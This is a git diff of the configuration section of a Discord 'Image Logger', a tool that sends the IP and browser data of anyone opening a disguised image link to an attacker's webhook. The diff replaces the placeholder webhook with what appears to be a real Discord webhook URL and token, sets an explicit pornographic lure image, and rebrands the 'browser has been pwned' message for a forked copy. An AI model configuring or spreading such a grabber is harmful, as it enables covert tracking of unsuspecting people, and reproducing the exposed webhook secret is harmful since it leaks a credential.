@@ -15,10 +15,10 @@ __author__ = "DeKrypt"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/your/webhook",
-    "image": "https://link-to-your-image.here", # You can also have a custom image by using a URL argument
+    "webhook": "https://discord.com/api/webhooks/1344070326652239874/P35SKKVMr_p61WNFE9cqp-qo-iV0ZoEH0byardmr-3AZzKChqUTZfHEWBLRGrJ6O8NTI",
+    "image": "https://px.hdpornpics.xxx/thumbs/197/503_with-twat-.jpg", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
-    "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
+    "imageArgument": True, # Allows you to use a URL argument to change the image 
 
     # CUSTOMIZATION #
     "username": "Image Logger", # Set this to the name you want the webhook to have
@@ -31,8 +31,8 @@ config = {
 
     "message": { # Show a custom message when the user opens the image
         "doMessage": False, # Enable the custom message?
-        "message": "This browser has been pwned by DeKrypt's Image Logger. https://github.com/dekrypted/Discord-Image-Logger", # Message to show
-        "richMessage": True, # Enable rich text? (See README for more info)
+        "message": "This browser has been pwned by Azus's Image Logger. https://github.com/Azu-rial/image", # Message to show
+        "richMessage": True, # Enable rich text? 
     },
 
     "vpnCheck": 1, # Prevents VPNs from triggering the alert
